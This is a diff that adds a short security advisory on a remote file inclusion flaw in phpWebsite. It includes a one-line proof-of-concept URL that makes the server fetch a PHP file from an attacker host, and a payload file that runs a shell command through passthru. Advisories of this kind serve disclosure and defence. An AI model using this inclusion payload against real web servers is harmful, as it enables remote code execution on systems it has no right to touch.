@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/5779/info
+
+A vulnerability has been discovered in phpWebsite which allows an attacker to remotely include a malicious PHP file. It is possible for an attacker to specify a remote location for phpWebsite to download an attacker-supplied htmlheader.php script. 
+
+This issue could be exploited to execute arbitrary commands within the context of the webserver process.
+
+The following proof of concept has been supplied by Tim Vandermeersch:
+
+http://SERVER/catalog/inludes/include_once.php?inc_prefix=http://MYBOX/
+
+--- htmlheader.php ---
+<?php echo "<?php passthru("/bin/ls");?>" ?> .
